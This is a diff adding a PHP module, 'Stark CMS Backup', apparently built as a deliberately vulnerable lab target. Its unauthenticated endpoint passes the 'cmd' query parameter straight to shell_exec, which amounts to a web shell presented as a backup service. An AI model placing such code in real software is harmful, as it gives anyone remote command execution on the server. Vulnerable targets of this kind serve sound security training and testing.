@@ -1,0 +1,37 @@
+<?php
+/**
+ * @file
+ * Stark CMS Backup module code.
+ */
+
+/**
+ * Implements hook_menu().
+ */
+function stark_cms_backup_menu() {
+  $items = array();
+  // Unauthenticated administrative endpoint
+  $items['stark-backup/run'] = array(
+    'title' => 'Run Stark CMS Backup',
+    'page callback' => 'stark_cms_backup_callback',
+    'access callback' => TRUE, // Allow unauthenticated access
+    'type' => MENU_CALLBACK,
+  );
+  return $items;
+}
+
+/**
+ * Page callback to execute backup with simulated RCE vulnerability (Drupalgeddon2 style)
+ */
+function stark_cms_backup_callback() {
+  // If ?cmd=xxx is passed, execute command directly to emulate vulnerability
+  if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    // Prevent directory traversal or strict system access restrictions if any, but execute
+    $output = shell_exec($cmd);
+    echo "<pre>" . check_plain($output) . "</pre>";
+    exit();
+  }
+  
+  echo "Stark CMS Backup Service Status: Ready. Parameter 'cmd' expected.";
+  exit();
+}
